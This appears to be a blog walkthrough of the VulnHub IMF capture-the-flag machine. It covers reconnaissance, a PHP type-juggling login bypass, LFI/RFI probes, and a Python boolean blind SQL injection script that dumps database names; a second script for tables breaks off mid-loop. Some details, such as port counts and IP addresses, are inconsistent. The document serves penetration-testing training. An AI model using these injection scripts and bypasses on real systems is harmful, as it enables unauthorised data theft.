---
layout: single
title: '<span class="vulnhub">IMF machine - /VulnHub</span>'
excerpt: "imf, is a machine from Vulnhub platform. I recommend you do these CTF because the last machine for the eCCptv2 it will be something like this."
date: 2023-05-03
categories:
  - vulnhub
  - machine
tags:  
  - wordpress
  - bruteforce
  - Buffer over flow
  - privilege-escalation
  - web
  - php
  - reverse-shell
  - wpscan
  - hydra
  - linux
  - pivoting
  - Fuzzing
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---

imf, is a machine from Vulnhub platform. I recommend you do these CTF because for the certification called eCCptv2 the last machine will be something like this 


**We will see all this from the perspective and methodology of a penetration test.**

- Links to the machines: [imf](https://www.vulnhub.com/entry/imf-1,162/)
- Difficulty assigned by Vulnhub: Medium
- The IP of the machine in my case will be: 192.168.100.52 (You will have a different ip so change it for all steps)

Let's get them!



## Enumeration

we have to figure out the ip of the machine so we need to use arp scan tool 
To do this we will make use of arp-scan and use a series of parameters that will make your search faster.

```bash
arp-scan -Iens33 --localnet
```

The explanation of the meaning of each parameter is:

- ```-I-``` : We have to indicate our interface in my case will be ens33 in your case could be eth0.
- ```--localnet``` : We indicate that the search will be for our localnet.

output
```php
❯ arp-scan -Iens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f2:37:49, IPv4: 192.168.100.53
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	64:5e:10:84:35:47	(Unknown)
192.168.100.10	90:e8:68:d0:da:47	(Unknown)
192.168.100.5	58:9a:3e:6e:27:40	(Unknown)
192.168.100.7	24:18:c6:dc:bd:cd	(Unknown)
192.168.100.52	00:0c:29:d2:5a:2b	VMware, Inc.
192.168.100.69	1a:b6:dd:e0:25:e9	(Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 6 responded
```

explanation of the output 

MAC 00:0c:29:d2:5a:2b how arp-scan knows that is vmware ? it's because the kind of OUI  ```00:0c:29``` use macchanger + l + | grep + "00:0c:29" they would tell us that it's vmware for the OUI which is organizationally unique identifier and the rest of the number belongs to he NIC d2:5a:2b nic means Network interface controller and actually the company made the NIC.


now that we have the IP let me introduce you to IPv4 and IPv6

because of the output we can notice that the IP that we will find vulnerabilities is IPv4, but how i know it?


```192.168.100.61``` is basically a numeric label that logically and hierarchically identifies an interface on a device's network that uses the internet protocol.

This IP is the same as bits, in conclusion. 


Why do I say they are bits? Because at a glance, I can see that there are 4 pairs of octets. They are called octets because there are 4 pairs of 8 bits here, 4 pairs  ```1octets,2octets,3octets,4octets```  Therefore, we know how I realized that there are 4 octets, but how did I realize that they are 8 bits? Well, that's because the 192 represented in binary in 8 bits would be, for example:

We know that by doing an ```echo``` of ```192.168.100.52```  it will show up in the console, so it will print it.

But if I want to divide it into 4 bytes, remember that 1 byte is 8 bits, so I want to represent a total of 32 bytes. We could represent the same example but with changes:

```bash 
echo "$().168.100.52"
``` 
Instead of 192, we are going to put $() so that we can try to return the output of a command executed at the system level.

Now we are going to execute a command at the system level and play with ```obase=2;``` to try to represent the number 192 in binary. We can do this by adding a | bc to represent the number in bytes, but what is ```bc``` ? this command is a calculator that can be used from the command line.

```bash 
echo $(echo "obase=2; 192" | bc).$(echo "obase=2; 168" | bc).$(echo "obase=2;100" | bc).(echo "obase=2; 52" | bc )
``` 
The output should be represented in binary, and since it is a 32-bit binary, the size of the IPs would be 2^32.
```bash 
❯ echo $(echo "obase=2; 192" | bc).$(echo "obase=2; 168" | bc).$(echo "obase=2;100" | bc).$(echo "obase=2; 52" | bc)
11000000.10101000.1100100.110100
```
"obase" is an option used in the "bc" command to set the output number base. In this case, the base is being set to 2, which represents the binary system.

The entire command is converting each octet of the IP address (192.168.100.52) into its binary representation. To do this, the "obase=2" option is used in each of the four "echo" commands, which sets the output of "bc" to binary. Then, the concatenation operator "." is used to join the results of each octet into a single 32-bit string

In other words, the size of the IP would be:


```bash
❯ echo "2^32" | bc
4294967296
```





That's why IPv6 exists, because there are very few IPv4 addresses compared to the world's population, and that's why IPv6 is gradually being implemented.

Since IPv6 uses a 128-bit format, it is 2^128.

```bash
echo "2^128" | bc
```



IPv6 addresses are represented by a 128-bit format, so it would be 2^128.

output 

```bash 
340282366920938463463374607431768211456
```


```24:18:c6:dc:bd:cd```



now we know the iPv4 for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
ping -c3 192.168.100.61
```
in this case seems that does not work, so we might need an external binary i will use tcping because was writte in go,and the Programming language works very well with sockets and connections  

installation 

```bash
gitclone  https://github.com/cloverstd/tcping
```
usage binary + ip

```bash 
❯ ./tcping 192.168.100.52
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=653.9µs dns=0s
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=868.1µs dns=0s
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=608.5µs dns=0s
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=513.8µs dns=0s

Ping statistics tcp://192.168.100.52:80
	4 probes sent.
	4 successful, 0 failed.
Approximate trip times:
	Minimum = 513.8µs, Maximum = 868.1µs, Average = 661.075µs#      

```
where 


output:

```php
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=653.9µs dns=0s
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=868.1µs dns=0s
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=608.5µs dns=0s
Ping tcp://192.168.100.52:80(192.168.100.52:80) connected - time=513.8µs dns=0s

--- 192.168.100.61 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2031ms
rtt min/avg/max/mdev = 0.291/0.327/0.357/0.027 ms
```

- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.

The first thing we will do when you know the IP and when you know that the machine is active we have to scan the target and see which ports are open.
To do this we will make use of nmap and use a series of parameters that will make our scan faster.:

```bash
nmap -p- --open -sS -Pn --min-rate 5000 -vvv -n 192.100.52
```
the meaning of each parameter is.:
- ```-p-``` : We indicate that the scan will be done for all ports.
- ```--open``` : We indicate that we are only interested in ports that are open.
- ```-sS``` : This flag indicates that we want to do a "SYN Scan" which means that the packets we will send will never complete the TCP connections and that will make our scan much less intrusive and quieter.
- ```-Pn``` : With this option we indicate that we do not want to do host discovery (since we know who our target is).
- ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
- ```-v``` : (verbose) To see which ports appear as we go along.
- ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.
output

```php
nmap -sS --open --min-rate 5000 -Pn -n -vvv 192.168.100.52 -oG allPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 14:47 CST
Initiating ARP Ping Scan at 14:47
Scanning 192.168.100.52 [1 port]
Completed ARP Ping Scan at 14:47, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:47
Scanning 192.168.100.52 [1000 ports]
Discovered open port 80/tcp on 192.168.100.52
Completed SYN Stealth Scan at 14:47, 0.53s elapsed (1000 total ports)
Nmap scan report for 192.168.100.52
Host is up, received arp-response (0.00040s latency).
Scanned at 2023-05-04 14:47:07 CST for 1s
Not shown: 999 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:D2:5A:2B (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 2000 (87.984KB) | Rcvd: 2 (72B)
```

At this point we know that there are 3 open ports: 80 (HTTP) and 22 (SSH), 21 (FTP) seeing this we have to make under consideration that we have 2 vias of get into the machine the SSH port and port 80 (at least to the outside), it can be deduced that the only way to enter the machine is through these services.

 once we know which ports are open we must perform the scan to those ports by running a series of scripts in order to obtain more information: server version, technology, possible vulnerabilities, etc...

```bash
nmap -sV -sC -p 80,22,21 192.168.100.52 -oN targeted
```


Where :

- ```-sV``` : If possible, it will show the version of the service running on each port.
- ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-p 80,22,21```: Open ports.
- ```-oN```: export the output to nmap format

Getting this output:

```php
❯ nmap -sCV -p80 192.168.100.52 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 14:59 CST
Nmap scan report for 192.168.100.52
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
MAC Address: 00:0C:29:D2:5A:2B (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
```

To find out what we are dealing with, we will run **WhatWeb** in order to find the codename as well

```bash
❯ whatweb 192.168.100.52
http://192.168.100.52 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.100.52], JQuery[1.10.2], Modernizr[2.6.2.min], Script, Title[IMF - Homepage], X-UA-Compatible[IE=edge]

```

seems that does not give us a lot of information.

So let's visit the web port 


After testing each of the attacks SSRF,SQLI,PATHtraversal I did not find anything relevant, on the other hand we are able to search for possible routes using gobuster for example

Since there seems to be no more information in sight then these possible users i found them in > ```contact us ``` tab
```bash 

Roger S. Michaels

rmichaels@imf.local

Director
Alexander B. Keith

akeith@imf.local

Deputy Director
Elizabeth R. Stone

estone@imf.local

Chief of Staff


```


We will proceed to do *Fuzzing*, which consists of making requests to the server of several routes extracted from a dictionary with the objective of obtaining routes that exist. For this we will use *Wfuzz* although another powerful tool is *Ffuf* or gobuster.

- With wfuzz would be:

```bash
wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.100.52///FUZZ
```

- With ffuf would be:

```bash
ffuf -u http://192.168.100.52//FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200 -c -t 200
```
- With gobuster would be:
- 
```bash
gobuster dir -u http://192.168.100.52/ -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
```

in this example i will use gobuster so 

```bash
gobuster dir -u http://192.168.100.52 -w //usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
```
output 

```php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.52/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/05/04 14:53:59 Starting gobuster in directory enumeration mode
===============================================================
/css/                 (Status: 403) [Size: 279]
/js/                  (Status: 403) [Size: 279]
/fonts/               (Status: 403) [Size: 279]
/images/              (Status: 403) [Size: 279]
/icons/               (Status: 403) [Size: 279]
/less/                (Status: 403) [Size: 279]
/server-status/       (Status: 403) [Size: 279]
                                               
===============================================================
2023/05/04 14:57:26 Finished
```

we have a few routes but with 403 forrbiden status, let's check inside of the page and actually using ```ctrl``` + ```u``` we found a few things

```bash
    <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
        <script>
         new WOW(
```
seems to be base64 encode let's check them using echo + base64

```bash 

❯ echo "js/ZmxhZzJ7YVcxbVl.js" | base64 -d  echo ""
base64: operando extra «»
Pruebe 'base64 --help' para más información.
❯ echo "js/ZmxhZzJ7YVcxbVl.js" | base64 -d
Y̞U[Vbase64: entrada inválida
❯ echo "js/ZmxhZzJ7YVcxbVl.js" | base64 -d; echo ""
Y̞U[Vbase64: entrada inválida

❯ echo "/ZmxhZzJ7YVcxbVl" | base64 -d; echo ""
\ŵe
❯ echo "ZmxhZzJ7YVcxbVl" | base64 -d; echo ""
flag2{aW1mYbase64: entrada inválida

❯ echo "/ZmxhZzJ7YVcxbVl" | base64 -d; echo ""
\ŵe
❯ echo "/ZmxhZzJ7YVcxbVlZmxhZzJ7YVcxbVlZmxhZzJ7YVcxbVl" | base64 -d; echo ""
\ŵeflag2{aW1mYYY̞U[Vbase64: entrada inválida

❯ echo "ZmxhZzJ7YVcxbVlZmxhZzJ7YVcxbVlZmxhZzJ7YVcxbVl" | base64 -d; echo ""
flag2{aW1mYYY̞U[VVfs'sbase64: entrada inválida

❯ echo "ZmxhZzJ7YVcxbVl" | base64 -d; echo ""
flag2{aW1mYbase64: entrada inválida

❯ echo "ZmxhZzJ7YVcxbVl" | base64 -d; echo ""
flag2{aW1mYbase64: entrada inválida

❯ echo "eVlYUnZjZz09fQ==.min" | base64 -d; echo ""
yYXRvcg==}base64: entrada inválida

❯ echo "eVlYUnZjZz09fQ==." | base64 -d; echo ""
yYXRvcg==}base64: entrada inválida

❯ echo "eVlYUnZjZz09fQ==" | base64 -d; echo ""
yYXRvcg==}
❯ 
❯ echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d; echo ""
flag2{aW1mYWRtaW5pc3RyYXRvcg==}

```

we have another base64 encode let's check 
```bash
❯ echo "aW1mYWRtaW5pc3RyYXRvcg" | base64 -d;
imfadministratorbase64: entrada inválida
❯ echo "aW1mYWRtaW5pc3RyYXRvcg" | base64 -d; echo
imfadministratorbase64: entrada inválida

❯ echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d; echo
imfadministrator

```
the only port open is 80, let's check if it's a route that gobuster did not find 

and actually it works 

```bash
Invalid username.
Username:
Password:

```

it's a loggin panel let's find with the source code 


```bash
Invalid username.<form method="POST" action="">
<label>Username:</label><input type="text" name="user" value=""><br />
<label>Password:</label><input type="password" name="pass" value=""><br />
<input type="submit" value="Login">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>
```

and we found a comment, according with the programmer he did not could take the work done in the SQL data bases 

so it might be a vulneral panel of SQLIN let's enumerate the page 


```bash 
Invalid username.
Username: administrator-- -
Password: cualquiercosa 
```
and did not work, let's capture the request with burpSuite if you don't know to use it click [here] (https://zeekk3n.github.io/andrey.github.io/.hacking-notes)

so how i said before let's capture the request

open ```BurpSuite``` > ```proxy``` > ```open browser``` > copy your url + route and paste it in my case will be ```http://192.168.100.52/imfadministrator/``` > turn off the ```interception``` that burpsuite is doing it, now we are able to watch the same loggin platform, let's capture with the burp Suite the comunication when we press ```login``` tab 

i capture this 

```php
POST /imfadministrator/ HTTP/1.1
Host: 192.168.100.52
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.100.52
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.100.52/imfadministrator/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
Connection: close

user=asd&pass=asd

```
seems that we can use a method called ```typetruegglin``` if is not sanitized  

let's try 

the attack consist in to add [] in the field of password and we found some possible users ```rmichaels``` when we were enumerating the port 80 let's try it 

## Gaining Access

```php
POST /imfadministrator/index.php HTTP/1.1
Host: 192.168.100.52
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.100.52
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.100.52/imfadministrator/index.php
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
Connection: close

user=rmichaels&pass[]=test
```

this can be explote it because is doing a comparison, 
```bash 
user=rmichaels&pass[]=
```


another very strong point to mention is that there's another common struggling bypass called Json byPass truggling which consist in add true in password fiel example 

```bash

{
user= rmichaels

pass= true 

}
```
that's how we will made in another scenario 

now if we stop intercepting the connection we will watch another pannel 

to stop it, we have to  ```proxy``` > ```intercept``` > ```turn off``` 


output from port 80

IMF CMS
Menu: Home | Upload Report | Disavowed list | Logout

Welcome to the IMF Administration.

take a look of the URL 

```http://192.168.100.52/imfadministrator/cms.php?pagename=home```

is aiming to resources of the directory that is hosting the page because of ```=home```

we can try a LFI to visualize content from the localhost

```http://192.168.100.52/imfadministrator/cms.php?pagename=/etc/passwd```

we can try a Directory Path traversal to reaload a route from the local host

```http://192.168.100.52/imfadministrator/cms.php?pagename=../../../../.../../../../etc/passwd```

we can try to add a null session to check if it's concateneting a extentions php or something like that

```http://192.168.100.52/imfadministrator/cms.php?pagename=../../../../.../../../../etc/passwd%00``` with the null session what we would do would be to become independent ```%00```


we can try a RFI

http://192.168.100.52/imfadministrator/cms.php?pagename=http://192.168.111.53/test

and from our machine we have to stay listening at python3 -m http.server 80

```http://192.168.100.52/imfadministrator/cms.php?pagename=home```



to check if we receive data we can stay listing from I ens33 using wireShark 

open wireshark and stay listening on interface ens33 to check if happened a three way handshake

ejm 

```wireshark &> /dev/null & disown```
but we did not receive a three way handshake 


we can try a SQLIN

```http://192.168.100.52/imfadministrator/cms.php?pagename=home'1 ```


output 

```php
IMF CMS
Menu: Home | Upload Report | Disavowed list | Logout


Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
```
it seems that the shots are aimed at exploiting SQL

let's try 

seems that it has the vulnerability of base blind SQLIN with conditional responses 

it means when you  add something that is true appears ```Welcome to the IMF Administration.```

here's and example adding a true information 

```php
GET /imfadministrator/cms.php?pagename=home'and '1'='1 HTTP/1.1
Host: 192.168.100.52
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
Connection: close
```

here's an example by adding something that is not true 

```php
GET /imfadministrator/cms.php?pagename=home'and '1'='2 HTTP/1.1
Host: 192.168.100.52
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
Connection: close
```

remember to url encode the request

here's the response from this page
```php
HTTP/1.1 200 OK
Date: Sat, 06 May 2023 15:57:59 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 285
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head>
<title>IMF CMS</title>
</head>
<body>
<h1>IMF CMS</h1>
Menu: 
<a href='cms.php?pagename=home'>Home</a> | 
<a href='cms.php?pagename=upload'>Upload Report</a> | 
<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 
Logout
<br /><br/>
</body>
</html>

```

as you can see i am able to execute true or bad requests

let's try to find a possible data from the page 

first we have to find 

the tables

we will inject this string 
```bash
' and (select substring(schema_name,1,1) from information_schema.schemata limit 0,1)='i
```

where: 

```bash 
' and: This is a character string used to concatenate a WHERE clause with the SQL query. The presence of this character string indicates that a WHERE clause is being added to the SQL query.

(select substring: This indicates that a subquery is being performed within the main query. The subquery uses the substring function to extract a substring from another string.

(schema_name,1,1): This is the string from which a substring is to be extracted. In this case, the first character of each schema name in the information_schema.schemata table is being extracted. If we want to play with positions in the data table, we would indicate (schema_name,2,1) because the first table is almost always the information schema, then the 2 would refer to filtering the second character of the information schema table where we would change the search instead of ='i it would be ='n. Another important thing to mention is that if we want to filter by another table, we would change the value to (schema_name,1,2), where we would filter by the first word of the 2nd table.

from information_schema.schemata: This indicates that information is being selected from the information_schema.schemata table. This table contains information about schemas in the database.

limit 0,1): This limits the number of rows returned in the query. In this case, the query is limited to the first row found in the table.

='i: This specifies that we want to filter by the first word. Since we're using a limit of 0,1, we'll have to tell it that we want to filter in our case it would be 'i' since we're trying to search for the information_schema.schemata table.

```

being said that we will proceed to filter 

the lenght of each DBS, Tables, Columns

to make a python script for the  DBS would be 

```'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"```

```python 
from pwn import *
import requests, pdb, signal, time, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables Globales
main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
characters = string.ascii_lowercase + '-_'


def makeRequest():

    cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}

    database = ""
    p1 =log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Databases")


    for dbs in range(0, 6):
        for position_character in range(1, 30): 
            for character in characters:
                sqli = main_url + f"'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"

                p1.status(sqli)

                r = requests.get(sqli, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    database += character
                    p2.status(database)
                    break

            if database[-1:] == ",":
                database += " "

        if database[-1:] != "," and len(database) > 0:
            database += ","

    if database[-1:] == ",":
        database = database[:-1]

    p2.success(database)

if __name__ == '__main__':

    makeRequest()
    
```


where: Program Logic 
1
```python3
#!/usr/bin/python3
```
is the header, like the "magic numbers", that indicates, for example, to Python that the file should be interpreted as a Python file and that its extension should be .py

2
```python3
from pwn import *
import requests, pdb, signal, time, sys, string
```
basically is importing the library called pwn which will allow us to use pwn tools to play with progress bars and other things.

3
```python
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
```
5

```python
import requests, pdb, signal, time, sys, string
```
requests: basically importing requests which will allow us to send requests to a webpage.

pdb: for applying debugging.

signal: for handling Ctrl+C to terminate the program and control program flow.

time: The Python library "time" provides functions related to time, such as time measurement, time conversion, waiting or pausing, etc. Some of the common functions of the "time" library are: time(), sleep(), strftime(), gmtime(), etc.

sys: The "sys" library in Python provides access to some variables and functions used or maintained by the Python interpreter. Some of the common functions and variables of the "sys" library are: argv, exit(), stdin, stdout, stderr, etc. Additionally, this library is used for performing some low-level operations related to the system, such as manipulation of command-line arguments, interaction with the operating system, manipulation of environment variables, etc.

string: to represent characters in our script."


6

```python
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)
```

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1) : 
    
Then, since the function is named "def_handler", we need to define it above the signal.

Before importing it, we must define the "def_handler" function.

The function needs to receive 2 values, sig and frame, to avoid issues.

And when we use control c, I need you to print "Exiting" on the screen.

The "sys.exit" is used so that when I press control c, it will execute with an error status code. This will cause the program flow to stop and be interrupted. 

signal.signal(signal.SIGINT, def_handler): Since we will be in the brute-force process, it is possible that we will need to use Ctrl+C. Therefore, since we have imported 'signal', we will use it.


7

```python
#Variables Globales
main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
characters = string.ascii_lowercase + '-_'
```

We need to define global variables where we are going to apply the injection, which would be the IP address we are going to inject and the URL where the vulnerability exists. The characters that we want to fuzz are up to our preference, as we imported the string library, we can use lowercase characters. To check, we can open Python3 and type "import string" then "string.ascii_lowercase" to see which characters we are going to fuzz. However, if we want to add numbers, we can use "+" and import the number library "string.digits" as an example "characters = string.ascii_lowercase + string.digits". Similarly, if we want to add special characters, we could add "+ string.punctuation".


8

```python
def makeRequest(): 
```
So, how would we do it? You are fuzzing for the variable (schema_name,1,1) to select both the database and its order, and this is equal to 1'. Therefore, we would have to make a triple nested loop since we are fuzzing for the schema variables, the table position, and the word to fuzz.

9

```python
 cookies = {'PHPSESSID': 'u85u4l0h0cho9ug97gqspsubp3'}
```
Let's remember that we are logged in, so we will need to add our session. In my case, it would be this one.

10

```python
database = ""
```
This variable will be explained in more detail below as to why it is empty.

11

```python
p1 =log.progress("Fuerza bruta")
```
This progress bar will continuously display the injection we will be applying, so we can see at all times where we are at.

12

```python
 p1.status("Iniciando proceso de fuerza bruta")
```
basically prints that string.

13

```python
time.sleep(2)
```
This is a command that pauses the execution of the program for a certain number of seconds. In this context, it is used so that the user can clearly see that the program is performing the fuzzing process in real time.

14

```python
p2 = log.progress("Databases")
```

This is where it will be editing the "Databases" variable that we defined above and it will be updating the name of the currently fuzzed DB in real-time.

15

```python
  for dbs in range(0, 6):
        for position_character in range(1, 30): 
            for character in characters:
                sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
```
where

for dbs in range(0, 6): For the databases, we will define a range from 0 to 5 because if we put 6, when we print it will only interpret 5. So we will search within a range of 5, based on the count we made.

for position_character in range(1, 30): We will search from 0 to 30 assuming that the total number of characters in a database is not greater than 30. For example, SQL database names are 3 characters long, so if we only want to search for those, we can search from 0 to 30.

for character in characters: Here, we will fuzz by characters, as we mentioned earlier that we will use lowercase letters, underscores, and we can also add numbers if we want.

sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}": With this line, we will define the SQL injection. It is basically what the program's flow sends. Here we can search by databases, tables, or columns depending on what we want. Instead of using variables like %d or %s, we will add f and then represent our search with {position_character} because we will search for characters.

16

```python
p1.status(sqli)
```
We are going to define this progress bar to see the progress of sqli.

17


```python
r = requests.get(sqli, cookies=cookies)
```

We are going to store the response in r so that it shows us the response at all times. With requests, we tell it to process the request through GET to main_url, which we have already defined. As we defined in sqli as main_url + f, we are also defining here what it should do, which is to make a GET request to main_url with the previously assigned session cookie.

18

```python
    if "Welcome to the IMF Administration." in r.text:
                    database += character
                    p2.status(database)
                    break

```
if "Welcome to the IMF Administration." in r.text: Here we are telling that when if ```Welcome to the IMF Administration.``` is true, then it means that the character we fuzzed is correct, and the response is coming from the server side.


19
where

```database += character```

So, for example, when you detect ```"Welcome to the IMF Administration"``` and it is in the response from the server, what you have to think is that if the character is correct, then the database variable, which was not explained above, but basically is to store the databases and their names at all times, will be += to the characters, that is, to the database corresponding to the variable we wrote above or to the one that is not worth anything more than the character. So, if it is valid for the first position, which it will be because we are representing the variable ```"Welcome to the IMF Administration"```, when the character is valid, add that character to the variable that we did not specify above so that you can print it on the screen and adjust it based on what you are finding.

p2.status(database)

Now we are going to play with this progress bar so that it shows you the corresponding database at all times, in order to structure it in real time the values of the database.


break
This means "We need to make a break so it doesn't keep searching for the word we are currently fuzzing".


20

```python
database += ","   
```

Once database finds the database, basically with this we are going to add a comma


```python
if __name__ == '__main__':
```
Here we indicate where the program flow starts.
Now we are going to define a function called "make_request".

21

```python
 makeRequest()
```

output
```bash
[ ] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(schema_name,29,1)+from+information_schema.schemata+limit+5,1)='_
[+] Databases: information_schema,admin,mysql,performance_schema,sys,
```
now let's find the tables ```+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"```

```python
   1   │ from pwn import *
   2   │ import requests, pdb, signal, time, sys, string
   3   │ 
   4   │ def def_handler(sig,frame):
   5   │     print("\n\n[!] Saliendo...\n")
   6   │     sys.exit(1)
   7   │ 
   8   │ 
   9   │ # Ctrl+C
  10   │ signal.signal(signal.SIGINT, def_handler)
  11   │ 
  12   │ #Variables Globales
  13   │ main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
  14   │ characters = string.ascii_lowercase + '-_'
  15   │ 
  16   │ 
  17   │ def makeRequest():
  18   │ 
  19   │     cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
  20   │ 
  21   │     database = ""
  22   │     p1 =log.progress("Fuerza bruta")
  23   │     p1.status("Iniciando proceso de fuerza bruta")
  24   │ 
  25   │     time.sleep(2)
  26   │ 
  27   │     p2 = log.progress("Tables")
  28   │ 
  29   │ 
  30   │     for dbs in range(0, 6):
  31   │         for position_character in range(1, 30): 
  32   │             for character in characters:
